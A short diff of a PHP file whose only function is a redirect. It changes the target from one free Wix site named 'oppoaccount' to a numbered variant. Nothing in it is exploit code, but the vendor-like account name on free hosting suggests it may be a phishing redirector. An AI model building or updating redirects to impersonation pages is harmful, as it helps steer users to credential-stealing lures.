@@ -1,4 +1,4 @@
 <?php
-header("Location: https://oppoaccount.wixsite.com/mysite");
+header("Location: https://oppoaccount8.wixsite.com/website");
 die();
 ?>
